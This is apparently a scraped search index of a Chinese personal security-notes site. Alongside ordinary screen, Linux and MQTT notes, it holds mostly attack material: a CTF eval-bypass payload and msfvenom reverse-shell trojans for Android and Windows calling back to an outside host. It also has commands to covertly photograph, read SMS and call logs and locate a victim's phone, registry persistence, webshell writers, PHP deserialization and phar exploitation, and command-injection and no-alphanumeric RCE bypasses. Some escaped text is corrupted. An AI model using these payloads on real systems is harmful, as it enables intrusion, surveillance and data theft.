Ctrl+A 然后按窗口号（如 0，1，2 等）可以直接切换到该窗口。 查看所有窗口： 按 Ctrl+A 然后按 \u0026quot;（双引号），你将看到一个窗口列表，使用上下箭头选择并回车切换。\n关闭窗口： 在一个窗口中按 Ctrl+D，这将关闭该窗口。\n高级操作\r#\r重命名窗口： 按 Ctrl+A 然后按 A，你可以为当前窗口设置一个新的名称，便于管理多个窗口。\n屏幕分割： screen 允许你分割屏幕，显示多个窗口。\n按 Ctrl+A 然后按 S 来水平分割屏幕。 按 Ctrl+A 然后按 Tab 来切换到下一个区域。 按 Ctrl+A 然后按 C 在新区域中创建一个新的终端。 按 Ctrl+A 然后按 X 来关闭当前分割。 复制模式： 如果你想复制 screen 内的文本，按 Ctrl+A 然后按 [ 进入复制模式。使用箭头键选择文本区域，按 Enter 复制。然后按 Ctrl+A，按 ] 将复制的文本粘贴到当前窗口。\n自定义配置\r#\r你可以通过编辑 ~/.screenrc 文件来自定义 screen 的行为。常用的配置包括：\n设置窗口标题 自定义键绑定 启动时自动创建多个窗口 常用快捷键总结\r#\rCtrl+A C：新建窗口 Ctrl+A N：切换到下一个窗口 Ctrl+A P：切换到前一个窗口 Ctrl+A D：断开会话 Ctrl+A A：重命名窗口 Ctrl+A [：进入复制模式 Ctrl+A ]：粘贴文本 Ctrl+A \u0026quot;：列出所有窗口 Ctrl+A S：分割屏幕 Ctrl+A Tab：切换分割区域 这些操作让你可以灵活地管理长时间运行的进程，即使你离线或断开连接。你可以随时恢复工作或开启多个终端处理任务。\n"},{"id":25,"href":"/docs/network-security/other/linux/","title":"linux 知识点","section":"other","content":"\r软连接\r#\r在 linux 中，/proc/self/cwd/会指向进程的当前目录，在不知道 flask 工作目录时，我们可以用/proc/self/cwd/flag/flag.jpg来访问 flag.jpg。 ln -s是Linux的软连接命令,其类似与windows的快捷方式。比如ln -s /etc/passwd shawroot 这会出现一个名为shawroot的文件,其内容为/etc/passwd的内容。 ln -s /proc/self/cwd/flag/flag.jpg shaw zip -ry root.zip shaw -r：将指定的目录下的所有子目录以及文件一起处理 -y：直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。 /proc/self\r#\rproc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。\n还有的是一些以数字命名的目录，他们是进程目录，系统中当前运行的每一个进程都有对应的一个目录在/proc下，以进程的PID号为目录名，他们是读取进程信息的接口\ncmdline cmdline 文件存储着启动当前进程的完整命令\ncat /proc/1083/cmdline cwd cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录\nls -al /proc/1083/cwd exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径 ls -al /proc/1090/exe environ\nenviron文件存储着当前进程的环境变量列表，通过查看environ目录来获取指定进程的环境变量信息\ncat /proc/2889/environ fd\n里面包含着当前进程打开的每一个文件的描述符(路径)\nls -al /proc/1083/fd /proc/self表示当前进程目录 /proc/self表示当前进程目录，在过滤了很多字符时就用，比如目录穿越，任意文件等\n/proc/self "},{"id":26,"href":"/docs/code/linux%E7%9F%A5%E8%AF%86/","title":"linux知识","section":"code","content":"创建文件夹\nmkdir test 创建文件\ntouch 1.txt 删除文件\nrm test 移动文件\nmv zip\n# zip 压缩文件夹/文件 zip -r file_name file_name.zip # 解压 zip unzip file_name.zip kali 换源\n/etc/apt/sources.list #中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云 #deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学 #deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling maincontrib non-free sudo apt update ssh 多终端\r#\r安装\napt-get install screen 创建一个终端\nscreen -S XX 回到原来的终端\nctrl A+D 查看所有终端\nscreen -ls 进入已存在的终端\nscreen -r XX 删除终端\nscreen -S XX -X quit "},{"id":27,"href":"/docs/wp/love_math/","title":"LOVE_math","section":"e .wp","content":"\u0026lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[\u0026#39;c\u0026#39;])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET[\u0026#39;c\u0026#39;]; if (strlen($content) \u0026gt;= 60) { die(\u0026#34;太长了不会算\u0026#34;); } $blacklist = [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\\[\u0026#39;, \u0026#39;\\]\u0026#39;]; foreach ($blacklist as $blackitem) { if (preg_match(\u0026#39;/\u0026#39; . $blackitem . \u0026#39;/m\u0026#39;, $content)) { die(\u0026#34;请不要输入奇奇怪怪的字符\u0026#34;); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [\u0026#39;abs\u0026#39;, \u0026#39;acos\u0026#39;, \u0026#39;acosh\u0026#39;, \u0026#39;asin\u0026#39;, \u0026#39;asinh\u0026#39;, \u0026#39;atan2\u0026#39;, \u0026#39;atan\u0026#39;, \u0026#39;atanh\u0026#39;, \u0026#39;bindec\u0026#39;, \u0026#39;ceil\u0026#39;, \u0026#39;cos\u0026#39;, \u0026#39;cosh\u0026#39;, \u0026#39;decbin\u0026#39; , \u0026#39;decoct\u0026#39;, \u0026#39;deg2rad\u0026#39;, \u0026#39;exp\u0026#39;, \u0026#39;expm1\u0026#39;, \u0026#39;floor\u0026#39;, \u0026#39;fmod\u0026#39;, \u0026#39;getrandmax\u0026#39;, \u0026#39;hexdec\u0026#39;, \u0026#39;hypot\u0026#39;, \u0026#39;is_finite\u0026#39;, \u0026#39;is_infinite\u0026#39;, \u0026#39;is_nan\u0026#39;, \u0026#39;lcg_value\u0026#39;, \u0026#39;log10\u0026#39;, \u0026#39;log1p\u0026#39;, \u0026#39;log\u0026#39;, \u0026#39;max\u0026#39;, \u0026#39;min\u0026#39;, \u0026#39;mt_getrandmax\u0026#39;, \u0026#39;mt_rand\u0026#39;, \u0026#39;mt_srand\u0026#39;, \u0026#39;octdec\u0026#39;, \u0026#39;pi\u0026#39;, \u0026#39;pow\u0026#39;, \u0026#39;rad2deg\u0026#39;, \u0026#39;rand\u0026#39;, \u0026#39;round\u0026#39;, \u0026#39;sin\u0026#39;, \u0026#39;sinh\u0026#39;, \u0026#39;sqrt\u0026#39;, \u0026#39;srand\u0026#39;, \u0026#39;tan\u0026#39;, \u0026#39;tanh\u0026#39;]; preg_match_all(\u0026#39;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/\u0026#39;, $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\u0026#34;请不要输入奇奇怪怪的函数\u0026#34;); } } //帮你算出答案 eval(\u0026#39;echo \u0026#39;.$content.\u0026#39;;\u0026#39;); } 好骚的姿势啊\n\u0026lt;?php $payload = [\u0026#39;abs\u0026#39;, \u0026#39;acos\u0026#39;, \u0026#39;acosh\u0026#39;, \u0026#39;asin\u0026#39;, \u0026#39;asinh\u0026#39;, \u0026#39;atan2\u0026#39;, \u0026#39;atan\u0026#39;, \u0026#39;atanh\u0026#39;, \u0026#39;bindec\u0026#39;, \u0026#39;ceil\u0026#39;, \u0026#39;cos\u0026#39;, \u0026#39;cosh\u0026#39;, \u0026#39;decbin\u0026#39; , \u0026#39;decoct\u0026#39;, \u0026#39;deg2rad\u0026#39;, \u0026#39;exp\u0026#39;, \u0026#39;expm1\u0026#39;, \u0026#39;floor\u0026#39;, \u0026#39;fmod\u0026#39;, \u0026#39;getrandmax\u0026#39;, \u0026#39;hexdec\u0026#39;, \u0026#39;hypot\u0026#39;, \u0026#39;is_finite\u0026#39;, \u0026#39;is_infinite\u0026#39;, \u0026#39;is_nan\u0026#39;, \u0026#39;lcg_value\u0026#39;, \u0026#39;log10\u0026#39;, \u0026#39;log1p\u0026#39;, \u0026#39;log\u0026#39;, \u0026#39;max\u0026#39;, \u0026#39;min\u0026#39;, \u0026#39;mt_getrandmax\u0026#39;, \u0026#39;mt_rand\u0026#39;, \u0026#39;mt_srand\u0026#39;, \u0026#39;octdec\u0026#39;, \u0026#39;pi\u0026#39;, \u0026#39;pow\u0026#39;, \u0026#39;rad2deg\u0026#39;, \u0026#39;rand\u0026#39;, \u0026#39;round\u0026#39;, \u0026#39;sin\u0026#39;, \u0026#39;sinh\u0026#39;, \u0026#39;sqrt\u0026#39;, \u0026#39;srand\u0026#39;, \u0026#39;tan\u0026#39;, \u0026#39;tanh\u0026#39;]; for($k=1;$k\u0026lt;=sizeof($payload);$k++){ for($i = 0;$i \u0026lt; 9; $i++){ for($j = 0;$j \u0026lt;=9;$j++){ $exp = $payload[$k] ^ $i.$j; echo($payload[$k].\u0026#34;^$i$j\u0026#34;.\u0026#34;==\u0026gt;$exp\u0026#34;); echo \u0026#34;\u0026lt;br /\u0026gt;\u0026#34;; } } } 字符串异或\nc=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})\u0026amp;0=system\u0026amp;1=cat%20/flag 其中\nis_nan^(6).(4))==\u0026gt;\u0026ldquo;is_nan^64\u0026rdquo;==\u0026gt;_G\ntan^(1).(5)同理==\u0026gt;ET\n拼接起来就是_GET\n常人想到的就是,但是这道题要小于60字符\n?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)(pi)($$pi(abs))\u0026amp;pi=system\u0026amp;abs=cat /flag base_convert(37907361743,10,36)==\u0026gt;hex2bin\ndechex(1598506324)==\u0026gt;_GET的10进制\n还有一种,用到了getallheaders\n$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1}) "},{"id":28,"href":"/docs/code/mqtt--%E4%B8%B2%E5%8F%A3--4055/","title":"MQTT \u0026\u0026 串口","section":"code","content":"\rMQTT 服务\r#\r开启服务\r#\r需要在页面中开启service 服务，确保开启。\n发送数据\r#\rMQTT 订阅主题默认是test，发送数据如下\n{\u0026#34;name\u0026#34;: \u0026#34;library\u0026#34;, \u0026#34;mode\u0026#34;: \u0026#34;write\u0026#34;, \u0026#34;serial\u0026#34;: \u0026#34;lamp\u0026#34;, \u0026#34;grip\u0026#34;:\u0026#34;off\u0026#34;} name\r#\r模块名字, 有4各模块分别为:\nlibrary library_ex fan wireless mode\r#\rmode 为控制模式, 有2个控制模式分别为:\nwrite read serial\r#\rserial 为模块的下的组件，如报警器，风扇，二氧化碳，有4个模块分别为\n组件名 说明 访问方式 lamp 报警灯 读写 fan 风扇 读写 co2 二氧化碳 只读 photoelectric 光电烟雾检测器 读写 grip\r#\r仅当mode为write时，grip用来控制开关\noff 关，非0ff开\n接受数据\r#\r提前串口发送数据\r#\r在设置界面中提前设置好预设的串口发送数据，不需要最后的两位crc，MQTT 服务会自动计算CRC校验。\n参考4055和4017的说明文档\n举例 烟雾报警器，有警报灯，光电烟雾检测器，通过4055控制，4055连接RS485 以下为串口发送数据:\n01 0f 00 15 00 01 01 xx xx 01 设备地址 0f 功能码 00 15 起始地址(根据DO 口, 如果是DO 5, 起始地址就是 00 15; DO 6 , 同理即为 00 16) 00 01 线圈数量 01 线圈状态 xx xx crc校验( crc16 modbus) 接受到MQTT发来的信息，会根据模块合组件来向串口发送数据\n"},{"id":29,"href":"/docs/hack/msf/","title":"msf","section":"hack","content":"\rAndroid\r#\rmsfvenom -p payload LHOST=本地地址 LPORT=本地端口 -f 文件类型 -o 木马文件 如\nmsfvenom -p android -p android/meterpreter/reverse_tcp LHOST=192.168.43.97 LPORT=5555 R\u0026gt; demo.apk 启动msfconsole\nuse exploit/multi/handler set payload android/meterpreter/reverse_tcp set lhost 192.168.134.129 set lport 555 exploit/run 在手机上启动\nsysinfo //查看手机信息 app_list //查看安装的app webcam_snap //拍照 dump_sms //查看短信 dump_calllog //通讯录 geolocate //GPS screenshot //jx\u0026#39;py Win\r#\rmsfvenom -p windows/meterpreter/reverse_tcp LHOST=free.idcfengye.com LPORT=10189 -f exe -o 123.exe 启动msfconsole\nfree.idcfengye.com\nuse exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost free.idcfengye.com set lport 1234 run/exploit 等待目标上线\nshell //获取目标shell win常用\ndir //目录 test //打印txt start // 以默认程序启动，如start 127.0.0.1/a.jpg就是以默认浏览器打开网页 chcp 65001 //解决中文乱码 设置开机自启动\nreg add \u0026#34;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\run\u0026#34; /v shell.exe /d \u0026#34;C:\\WINDOWS\\system32 \u0026#34; /f reg add \u0026ldquo;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\run\u0026rdquo; /v shell.exe /d \u0026ldquo;C:\\WINDOWS\\system32 \u0026quot; /f\n"},{"id":30,"href":"/docs/network-security/node/%E5%8E%9F%E5%BD%A2%E9%93%BE%E6%B1%A1%E6%9F%93/","title":"node 原型链污染","section":"node","content":"\r命令执行\r#\r常用\nrequire(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;ls\u0026#39;) require(\u0026#39;child_process\u0026#39;).spawnSync(\u0026#39;cat\u0026#39;,[\u0026#39;/flag\u0026#39;]).output global.process.mainModule.constructor._load(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;dir\u0026#39;) "},{"id":31,"href":"/docs/network-security/php/php/","title":"php","section":"php","content":"\rZip\r#\r利用 ZipArchive 内置类的open方法达到删除文件效果\r#\rclass Jesen { public $filename=\u0026#39;11.php\u0026#39;; public $content=8; public $me; } $a=new Jesen; $a-\u0026gt;me=new ZipArchive; echo serialize($a); base64\r#\r文件包含过滤了base,用其他编码，不行多试几个\nUCS-4* UCS-4BE UCS-4LE* UCS-2 UCS-2BE UCS-2LE UTF-32* UTF-32BE* UTF-32LE* UTF-16* UTF-16BE* UTF-16LE* UTF-7 UTF7-IMAP UTF-8* ASCII* EUC-JP* SJIS* eucJP-win* SJIS-win* ... \\\\具体支持的编码可见php官方文档 \\\\https://www.php.net/manual/zh/mbstring.supported-encodings.php php://filter/convert.base64-encode/resource= payload\nphp://filter//convert.iconv.EUC-JP*.UCS-4*/resource=flag.php "},{"id":32,"href":"/docs/network-security/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"php","section":"php","content":"\r反序列化\r#\r序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。\n两个函数\nserialize 将对象格式化成有序的字符串\nunserialize 将字符串还原成原来的对象\n\u0026lt;?php class test{ public $a; public $b; function __construct(){$this-\u0026gt;a = \u0026#34;xiaoshizi\u0026#34;;$this-\u0026gt;b=\u0026#34;laoshizi\u0026#34;;} function happy(){return $this-\u0026gt;a;} } $a = new test(); echo serialize($a); ?\u0026gt; 输出\nO:4:\u0026#34;test\u0026#34;:2:{s:1:\u0026#34;a\u0026#34;;s:9:\u0026#34;xiaoshizi\u0026#34;;s:1:\u0026#34;b\u0026#34;;s:8:\u0026#34;laoshizi\u0026#34;;} 序列化后字符串的格式\nO:4:\u0026#34;对象名\u0026#34;:变量数量:{s:变量名长度:\u0026#34;变量名\u0026#34;;s:变量值长度:\u0026#34;变量值\u0026#34;;s:1:\u0026#34;b\u0026#34;;s:8:\u0026#34;laoshizi\u0026#34;;} 修饰符\r#\r如果变量前的修饰符是protected或private，先将代码的修饰符改为public进行序列化，再做修改\nprivate =\u0026gt;%00class_name%00name 长度+类名长度+2 protected =\u0026gt;%00*%00name 长度+3 php7.1+不敏感\n常见的魔术方法\n__wakeup() //执行unserialize()时，先会调用这个函数 __sleep() //执行serialize()时，先会调用这个函数 __destruct() //对象被销毁时触发 __call() //在对象上下文中调用不可访问的方法时触发 __callStatic() //在静态上下文中调用不可访问的方法时触发 __get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法 __set() //用于将数据写入不可访问的属性 __isset() //在不可访问的属性上调用isset()或empty()触发 __unset() //在不可访问的属性上使用unset()时触发 __toString() //把类当作字符串使用时触发 __invoke() //当尝试将对象调用为函数时触发 字符串逃逸\r#\r\u0026lt;?php function repl($s){ return str_replace(\u0026#39;flag\u0026#39;, \u0026#39;hack!\u0026#39;, $s); } class A{ public $user=\u0026#39;admin\u0026#39;; public $pwd=\u0026#39;123456\u0026#39;; } $a=new A(); $u=serialize($a); echo $u.\u0026#39; \u0026#39;; $b=unserialize($u); echo $b-\u0026gt;user.\u0026#39; \u0026#39;.$b-\u0026gt;pwd; ?\u0026gt; 输出，没问题\nO:1:\u0026#34;A\u0026#34;:2:{s:4:\u0026#34;user\u0026#34;;s:5:\u0026#34;admin\u0026#34;;s:3:\u0026#34;pwd\u0026#34;;s:6:\u0026#34;admin1\u0026#34;;} admin 123456 在反序列化的时候php会根据s所指定的字符长度去读取后边的字符。如果指定的长度s错误则反序列化就会失败。\n当我们将user设置为\u0026quot;;s:4:\u0026ldquo;pass\u0026rdquo;;s:6:\u0026ldquo;admin1\u0026rdquo;;}\n长度为27\n因为flag被替换成了hack!，字符增长，导致提前闭合，后面的自然抛弃了\n\u0026lt;?php function repl($s){ return str_replace(\u0026#39;flag\u0026#39;, \u0026#39;hack!\u0026#39;, $s); } class A{ public $user=\u0026#39;flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag\u0026#34;;s:3:\u0026#34;pwd\u0026#34;;s:6:\u0026#34;admin1\u0026#34;;}\u0026#39;; public $pwd=\u0026#39;123456\u0026#39;; } $a=new A(); $u=repl(serialize($a)); echo $u.\u0026#39; \u0026#39;; $b=unserialize($u); echo $b-\u0026gt;user.\u0026#39; \u0026#39;.$b-\u0026gt;pwd; ?\u0026gt; 输出\nO:1:\u0026#34;A\u0026#34;:2:{s:4:\u0026#34;user\u0026#34;;s:130:\u0026#34;hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!\u0026#34;;s:3:\u0026#34;pwd\u0026#34;;s:6:\u0026#34;admin1\u0026#34;;}\u0026#34;;s:3:\u0026#34;pwd\u0026#34;;s:6:\u0026#34;123456\u0026#34;;} hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack!hack! admin1 还有一种字符变少的情况\n\u0026lt;?php function str_rep($string){ return preg_replace( \u0026#39;/php|flag/\u0026#39;,\u0026#39;\u0026#39;, $string); } $test[\u0026#39;name\u0026#39;] = \u0026#39;flagflagflagflagflagflag\u0026#39;; $test[\u0026#39;sign\u0026#39;] = \u0026#39;hello\u0026#34;;s:4:\u0026#34;sign\u0026#34;;s:4:\u0026#34;eval\u0026#34;;s:6:\u0026#34;number\u0026#34;;s:4:\u0026#34;2000\u0026#34;;}\u0026#39;; $test[\u0026#39;number\u0026#39;] = \u0026#39;2020\u0026#39;; $temp = str_rep(serialize($test)); printf($temp); $fake = unserialize($temp); echo \u0026#39;\u0026lt;br\u0026gt;\u0026#39;; print(\u0026#34;name:\u0026#34;.$fake[\u0026#39;name\u0026#39;].\u0026#39;\u0026lt;br\u0026gt;\u0026#39;); print(\u0026#34;sign:\u0026#34;.$fake[\u0026#39;sign\u0026#39;].\u0026#39;\u0026lt;br\u0026gt;\u0026#39;); print(\u0026#34;number:\u0026#34;.$fake[\u0026#39;number\u0026#39;].\u0026#39;\u0026lt;br\u0026gt;\u0026#39;); ?\u0026gt; 输出，因为被替换成空，所以往后找24个字符\na:3:{s:4:\u0026#34;name\u0026#34;;s:24:\u0026#34;\u0026#34;;s:4:\u0026#34;sign\u0026#34;;s:54:\u0026#34;hello\u0026#34;;s:4:\u0026#34;sign\u0026#34;;s:4:\u0026#34;eval\u0026#34;;s:6:\u0026#34;number\u0026#34;;s:4:\u0026#34;2000\u0026#34;;}\u0026#34;;s:6:\u0026#34;number\u0026#34;;s:4:\u0026#34;2020\u0026#34;;} name:\u0026#34;;s:4:\u0026#34;sign\u0026#34;;s:54:\u0026#34;hello sign:eval number:2000 __wakeup\r#\r在反序列化的操作中，会检查一个叫__wakeup的方法\n当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行\n将要求序列化后为O:4:\u0026ldquo;Demo\u0026rdquo;:1:{s:4:\u0026ldquo;flag\u0026rdquo;;s:3:\u0026ldquo;111\u0026rdquo;;}，xctf后有一个数字1，这个1是代表这个类有一个属性。wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。\nO:4:\u0026#34;Demo\u0026#34;:2:{s:4:\u0026#34;flag\u0026#34;;s:3:\u0026#34;111\u0026#34;;} pop链\r#\rpass\nphar反序列化\r#\rPhar是将php文件打包而成的一种压缩文档，类似于Java中的jar包。它有一个特性就是phar文件会以序列化的形式储存用户自定义的meta-data。以扩展反序列化漏洞的攻击面，配合phar://协议使用。\n利用条件\nphar能够上传到服务器\n要有魔术方法作为“跳板”\n文件操作函数的参数可控，且：、/、phar等字样坏没有被过滤\n生成phar文件\n\u0026lt;?php class test{ public $name=\u0026#39;phpinfo();\u0026#39;; } $phar=new phar(\u0026#39;test.phar\u0026#39;);//后缀名必须为phar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#34;);//设置stub $obj=new test(); $phar-\u0026gt;setMetadata($obj);//自定义的meta-data存入manifest $phar-\u0026gt;addFromString(\u0026#34;flag.txt\u0026#34;,\u0026#34;flag\u0026#34;);//添加要压缩的文件 //签名自动计算 $phar-\u0026gt;stopBuffering(); ?\u0026gt; 该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。\n受到影响的函数\nphar绕过\n文件类型：修改为png等可以上传的文件依旧可以触发\nphar关键字检测：9.\ncompress.zlib://绕过 compress.bzip://phar:///test.phar/test.txt compress.bzip2://phar:///home/sx/test.phar/test.txt compress.zlib://phar:///home/sx/test.phar/test.txt php://filter/resource=phar:///test.phar/test.txt // 还可以使用伪协议的方法绕过 php://filter/read=convert.base64-encode/resource=phar://phar.phar __HALT_COMPILER特征检测：用gzip压缩后，修改为可以上传的文件格式\ngzip flag.phar "},{"id":33,"href":"/docs/network-security/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Clinux%E7%BB%95%E8%BF%87/","title":"php命令执行linux绕过","section":"php","content":"在php中虽然有命令执行，但是过滤了很多，会让我们的难度变大\n空格\r#\r${IFS} $IFS$9 \u0026gt; \u0026lt;\u0026gt; inode\r#\r打印文件的inode号\nls -i tac `find / -inum incode号` 在获取到inode号配合可以查找文件及所有子目录文件并打印\ncat `find . -inum inode号` 在linux 会优先执行反引号中的内容\ntee\r#\r欲执行命令 | tee 回显文件 如 l\\s / | tee 1.txt 再访问1.txt 关键字被过滤 在中间加\\ cat\r#\rcat、tac、more、less、head、tail、nl、sed、sort、uniq 编码\r#\r用base64，解密并执行\necho bHMgLWwK | base64 -d | sh echo \u0026#34;636174202f666c6167\u0026#34; | xxd -r -p|bash #ascii的八进制编码 $(printf \u0026#34;\\154\\163\u0026#34;) --\u0026gt;ls $(printf \u0026#34;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\u0026#34;) {printf,\u0026#34;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\u0026#34;}|$0 写shell ${printf,\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76\u0026#34;} # 脚本 def encodeOctal(str): # 只显示八进制 print(\u0026#34;八进制\u0026#34;) for i in str: print(oct(ord(i)).replace(\u0026#34;0o\u0026#34;, \u0026#34;\\\\\u0026#34;), end=\u0026#34;\u0026#34;) # 显示Linux八进制payload print(\u0026#34;\\nlinux payload\u0026#34;) payload = \u0026#39;$(printf${IFS}\u0026#34;\u0026#39; for i in str: payload += oct(ord(i)).replace(\u0026#34;0o\u0026#34;, \u0026#34;\\\\\u0026#34;) payload += \u0026#39;\u0026#34;)\u0026#39; print(payload) if __name__ == \u0026#39;__main__\u0026#39;: str = \u0026#34;cat flag_1s_here/flag_831b69012c67b35f.php\u0026#34; encodeOctal(str) 分隔符\n%0a %0d ; | || \u0026amp;\u0026amp; 拼接\na=l;b=s;$a$b 反引号\r#\rexec(\u0026#34;echo `ls`\u0026#34;)//可以执行命令 再linux中会优先直线反引号中的命令，如 system(\u0026#34;ls `echo /flag\u0026gt;/var/www/html/flag.txt`\u0026#34;) 无字符rce\r#\r取反 \u0026lt;?php echo urlencode(~\u0026#39;system\u0026#39;).\u0026#34;\\n\u0026#34;; echo urlencode(~\u0026#39;cat /flag\u0026#39;); (~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98) [~%8c%86%8c%8b%9a%92][!%FF]([~%9c%8a%8d%8d%9a%91%8b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())); eval(heaer[\u0026#39;x\u0026#39;]) 再写shell\nfile_put_contents(\u0026#34;1.php\u0026#34;,\u0026#34;\u0026lt;?php @eval(\\$_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt;\u0026#34;); 异或\na:\u0026#39;%40\u0026#39;^\u0026#39;%21\u0026#39; ; s:\u0026#39;%7B\u0026#39;^\u0026#39;%08\u0026#39; ; s:\u0026#39;%7B\u0026#39;^\u0026#39;%08\u0026#39; ; e:\u0026#39;%7B\u0026#39;^\u0026#39;%1E\u0026#39; ; r:\u0026#39;%7E\u0026#39;^\u0026#39;%0C\u0026#39; ; t:\u0026#39;%7C\u0026#39;^\u0026#39;%08\u0026#39; P:\u0026#39;%0D\u0026#39;^\u0026#39;%5D\u0026#39; ; O:\u0026#39;%0F\u0026#39;^\u0026#39;%40\u0026#39; ; S:\u0026#39;%0E\u0026#39;^\u0026#39;%5D\u0026#39; ; T:\u0026#39;%0B\u0026#39;^\u0026#39;%5F\u0026#39; 拼接起来： $_=(\u0026#39;%40\u0026#39;^\u0026#39;%21\u0026#39;).(\u0026#39;%7B\u0026#39;^\u0026#39;%08\u0026#39;).(\u0026#39;%7B\u0026#39;^\u0026#39;%08\u0026#39;).(\u0026#39;%7B\u0026#39;^\u0026#39;%1E\u0026#39;).(\u0026#39;%7E\u0026#39;^\u0026#39;%0C\u0026#39;).(\u0026#39;%7C\u0026#39;^\u0026#39;%08\u0026#39;); // $_=assert $__=\u0026#39;_\u0026#39;.(\u0026#39;%0D\u0026#39;^\u0026#39;%5D\u0026#39;).(\u0026#39;%0F\u0026#39;^\u0026#39;%40\u0026#39;).(\u0026#39;%0E\u0026#39;^\u0026#39;%5D\u0026#39;).(\u0026#39;%0B\u0026#39;^\u0026#39;%5F\u0026#39;); // $__=_POST $___=$$__; //$___=$_POST $_($___[_]);//assert($_POST[_]); 放到一排就是： $_=(\u0026#39;%40\u0026#39;^\u0026#39;%21\u0026#39;).(\u0026#39;%7B\u0026#39;^\u0026#39;%08\u0026#39;).(\u0026#39;%7B\u0026#39;^\u0026#39;%08\u0026#39;).(\u0026#39;%7B\u0026#39;^\u0026#39;%1E\u0026#39;).(\u0026#39;%7E\u0026#39;^\u0026#39;%0C\u0026#39;).(\u0026#39;%7C\u0026#39;^\u0026#39;%08\u0026#39;);$__=\u0026#39;_\u0026#39;.(\u0026#39;%0D\u0026#39;^\u0026#39;%5D\u0026#39;).(\u0026#39;%0F\u0026#39;^\u0026#39;%40\u0026#39;).(\u0026#39;%0E\u0026#39;^\u0026#39;%5D\u0026#39;).(\u0026#39;%0B\u0026#39;^\u0026#39;%5F\u0026#39;);$___=$$__;$_($___[_]); 自增\n\u0026lt;?php $_=[]; $_=@\u0026#34;$_\u0026#34;; // $_=\u0026#39;Array\u0026#39;; $_=$_[\u0026#39;!\u0026#39;==\u0026#39;@\uu0026#39;_\u0026#39;; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P $____.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O $____.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S $____.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T $____.=$__; $_=$$____; $___($_[_]); // ASSERT($_POST[_]); %24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B\u0026#39;!\u0026#39;%3D%3D\u0026#39;%40\uu0026#39;_\uu0026#39;\u0026#39;.[]; $_=$_[\u0026#39;_\u0026#39;]; $_++; $_++; $_++; $__=++$_; $_++; $___=++$_; $_++; $_++; $_++; $_++; $_++; $_++; $_++; $_++; $_++; $_++; $_++; $_++; $_++; $_=_.$___.$__.$_; $$_[_]($$_[__]); 